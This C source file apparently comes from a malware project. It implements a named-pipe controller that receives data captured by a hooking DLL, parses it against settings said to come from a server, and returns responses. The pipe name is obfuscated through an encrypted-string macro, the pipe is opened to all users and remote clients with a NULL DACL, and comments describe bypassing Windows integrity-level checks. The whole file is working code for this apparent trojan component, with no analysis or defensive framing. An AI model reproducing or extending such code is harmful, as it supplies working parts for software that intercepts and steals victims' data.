/*
	kbriController.cpp
	Server pipe routines to receive data from hook dll and parse it 
	according to internal state and settings, received from server

*/

#include <Windows.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"
#include "..\inc\CryptoStrings.h"
#include "..\inc\MyStreams.h"

#include "KBRI.h"
#include "kbriDataParser.h"

#include "kbriController.h"

/*
	Prepares SECURITY_ATTRIBUTES to allow access from any user/level to the object
	Failing to use this function will make object unaccessible (ERROR_ACCESS_DENIED)
	from lower user privileges or integrity levels
*/
VOID _kcMakeEveryoneDACL(SECURITY_ATTRIBUTES *sa)
{
	OSVERSIONINFO osvi = { 0 };

	DbgPrint("entered");

	sa->nLength = sizeof(SECURITY_ATTRIBUTES);
	sa->lpSecurityDescriptor = my_alloc(SECURITY_DESCRIPTOR_MIN_LENGTH);
	sa->bInheritHandle = TRUE;

	DbgPrint("sa inited, calling InitializeSecurityDescriptor()");

	if (!InitializeSecurityDescriptor(sa->lpSecurityDescriptor, SECURITY_DESCRIPTOR_REVISION)) { DbgPrint("WARN: failed InitializeSecurityDescriptor() with code %04Xh", GetLastError()); }

	DbgPrint("calling SetSecurityDescriptorDacl()");
	if (!SetSecurityDescriptorDacl(sa->lpSecurityDescriptor, TRUE, NULL, FALSE)) { DbgPrint("WARN: failed SetSecurityDescriptorDacl() with code %04Xh", GetLastError()); }

	// NB: GetVersionEx() possibly fails in x64 server if running as service
	// if >= Vista, perform special measures to avoid integrity levels problem
	DbgPrint("about to call GetVersionEx");
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if (!GetVersionEx(&osvi)) { DbgPrint("WARN: le %04Xh calling GetVersionEx()", GetLastError()); return; }
	if (osvi.dwMajorVersion >= 6)	{

		// http://blogs.technet.com/b/nettracer/archive/2010/07/23/why-does-anonymous-pipe-access-fail-on-windows-vista-2008-windows-7-or-windows-2008-r2.aspx
		// http://blog.m-ri.de/index.php/2009/12/08/windows-integrity-control-schreibzugriff-auf-eine-named-pipe-eines-services-ueber-anonymen-zugriff-auf-vista-windows-2008-server-und-windows-7/
		DbgPrint("NOTE: extra SACL modification to bypass integrity levels check (TODO!!!!)");

		// Now the trick with the SACL:
		// We set SECURITY_MANDATORY_UNTRUSTED_RID to SYSTEM_MANDATORY_POLICY_NO_WRITE_UP
		// Anonymous access is untrusted, and this process runs equal or above medium
		// integrity level. Setting "S:(ML;;NW;;;LW)" is not sufficient.
		//_tcscat(szBuff, _T("S:(ML;;NW;;;S-1-16-0)"));

	} // if >= Vista

	DbgPrint("done");
}

#define KC_CHUNK_SIZE 16 * 1024

/*
	Thread created for every client connection on pipe
	Assume <DWORD dwDataLen><BYTE[] bData> format
*/
DWORD WINAPI thrkcPipeClientConnectionDispatch(LPVOID lpParameter)
{
	HANDLE hPipe = (HANDLE)lpParameter;
	DWORD dwDataLen = 0;	// len of data, as supplied by user connection
	DWORD dwRead = 0;	// amount of data read by ReadFile()

	LPVOID pBuffer = NULL;	// tmp buffer to read incoming data in chunks

	MY_STREAM ms = { 0 };		// stream to hold input / output data, which is read from remote by small chunks

	BOOL fRes = FALSE;

	// resulting buffer and it's size after processing original input
	LPVOID pResult = NULL;
	DWORD dwResultLen = 0;

	DWORD dwWritten = 0;	// WriteFile()'s result

	DbgPrint("entered");

	// dbg query username connected
#ifdef _DEBUGx
	LPWSTR wszUsername = (LPWSTR)my_alloc(1024);
	if (GetNamedPipeHandleState(hPipe, NULL, NULL, NULL, NULL, wszUsername, 512)) { DbgPrint("got connection from %ws", wszUsername); }
	else { DbgPrint("WARN: le %04Xh determining username", GetLastError()); }
	my_free(wszUsername);
#endif

	do { // not a loop

		// read first DWORD, assumed to be data len
		if (!ReadFile(hPipe, &dwDataLen, sizeof(DWORD), &dwRead, NULL)) { DbgPrint("ERR: failed to read first DWORD, le %u", GetLastError()); break; }
		if (dwRead != sizeof(DWORD)) { DbgPrint("ERR: unexpected len %u at first read", dwRead); break; }

		// check value to be in a sane range
		if ((dwDataLen < 900) || (dwDataLen>10000000)) { DbgPrint("ERR: supplied data len %u is out of sane range", dwDataLen); break; }

		//DbgPrint("OK: expected data len %u", dwDataLen);
 
		// alloc resulting buffer
		if (!(pBuffer = my_alloc(KC_CHUNK_SIZE))) { DbgPrint("ERR: failed to alloc %u read buffer", KC_CHUNK_SIZE); break; }

		// prepare stream
		msInitStream(&ms);

		// processing loop until user supply 0 len
		do {

			// do read data 
			dwRead = 0;
			fRes = ReadFile(hPipe, pBuffer, KC_CHUNK_SIZE, &dwRead, NULL);

			if (dwRead) {
				
				// check if read ok
				//DbgPrint("read %u", dwRead);

				// add part to resulting stream buff
				ms.msWriteStream(&ms, pBuffer, dwRead);

				// check if read all expected data
				if (ms.lDataLen >= dwDataLen) { /*DbgPrint("all read");*/ break; }


			}  // if dwRead

			// check for exit loop
			if ((!fRes) && (GetLastError() != ERROR_MORE_DATA)) { DbgPrint("read finished, possibly with no luck"); break; }

		} while (TRUE); // while data to be read present


		// check for too much data
		if (ms.lDataLen > dwDataLen) { DbgPrint("ERR: size mismatch, expected %u, received %u", dwDataLen, ms.lDataLen); break; }


		//DbgPrint("OK: read %u data", ms.lDataLen);

		// do processing
		if (kdpParseData(ms.pData, ms.lDataLen, &pResult, &dwResultLen)) { DbgPrint("OK: received data to be sent, newlen %u", dwResultLen); } else { DbgPrint("nothing to be sent"); }

		// send answer
		if (!WriteFile(hPipe, &dwResultLen, sizeof(DWORD), &dwWritten, NULL)) { DbgPrint("ERR: failed to send first dword, le %u", GetLastError()); break; }

		if (pResult && dwResultLen) {
			if (!WriteFile(hPipe, pResult, dwResultLen, &dwWritten, NULL)) { DbgPrint("ERR: failed to send data, le %u", GetLastError()); break; }
		}

		//DbgPrint("done ok");

	} while (FALSE); // not a loop

	// cleanup
	// Flush the pipe to allow the client to read the pipe's contents 
	// before disconnecting. Then disconnect the pipe, and close the 
	// handle to this pipe instance. 
	FlushFileBuffers(hPipe);
	DisconnectNamedPipe(hPipe);
	CloseHandle(hPipe);

	if (pBuffer) { my_free(pBuffer); }
	if (ms.pData) { ms.msFreeStream(&ms); }
	if (pResult) { my_free(pResult); }

	ExitThread(0);
}



/*
	A thread to perform pipe server task, simplified code from PipeWorks.cpp
*/
DWORD WINAPI thrkcPipeServer(LPVOID lpParameter)
{
	KBRI_GLOBALS *KBRI = (KBRI_GLOBALS *)lpParameter;	// passed by caller

	SECURITY_ATTRIBUTES sa = { 0 };
	LPWSTR wszPipeName = NULL;
	HANDLE hPipe = INVALID_HANDLE_VALUE; 
	BOOL fConnected = FALSE;
	DWORD dwThreadId = 0;

	DbgPrint("entered");

	_kcMakeEveryoneDACL(&sa);
	wszPipeName = CRSTRW("\\\\.\\pipe\\pg0F9EC0DB75F67E1DBEFB3AFA2", "\x00\x80\x03\x0f\x24\x80\x3f\x3b\x5e\xa4\xf3\xee\xe0\x7d\xff\xd7\xd7\x08\x85\xfe\x95\x1b\xd3\xa3\xb2\x4f\x36\x41\x26\xaf\x66\x16\x74\xfa\x06\x01\x12\xeb\x22\x21\x31\xca\x0a");
	
	for (;;) {

		DbgPrint("creating pipe server socket");

		hPipe = CreateNamedPipe(
			wszPipeName,
			PIPE_ACCESS_DUPLEX | FILE_FLAG_WRITE_THROUGH,
			PIPE_TYPE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
			PIPE_UNLIMITED_INSTANCES,
			10240,
			10240,
			0,
			&sa);

		// check result
		if (hPipe == INVALID_HANDLE_VALUE) { DbgPrint("ERR: CreateNamedPipe() failed, le %04Xh", GetLastError()); return 0; }

		// prevent from inheritance in child processes (looks like ShellExecuteEx() inherits handles without possibility to disable via params)
		if (!SetHandleInformation(hPipe, HANDLE_FLAG_INHERIT, 0)) { DbgPrint("ERR: failed to set not inheritable flag, le %p", GetLastError()); }

		// wait for client connection 
		fConnected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);

		// check if connection was ok
		if (fConnected) {

			// create dispatcher thread
			CloseHandle(CreateThread(NULL, 0, thrkcPipeClientConnectionDispatch, (LPVOID)hPipe, 0, &dwThreadId));

		} else {
			DbgPrint("some error while client connection");
			CloseHandle(hPipe);
		}

		DbgPrint("looping");

	} // infinite for

	if (wszPipeName) { my_free(wszPipeName); }

	ExitThread(0);
}

/*
	Creates server pipe with some pre-defined name to wait for hook dll requests
*/
BOOL kcStartController(KBRI_GLOBALS *KBRI)
{
	BOOL bRes = FALSE;	


	DbgPrint("entered");
	CloseHandle(CreateThread(NULL, 0, thrkcPipeServer, (LPVOID)KBRI, 0, &KBRI->dwPipeServerThreadId)); // save server thread id so it would be possible to perform termination
	bRes = TRUE;

	return bRes;
}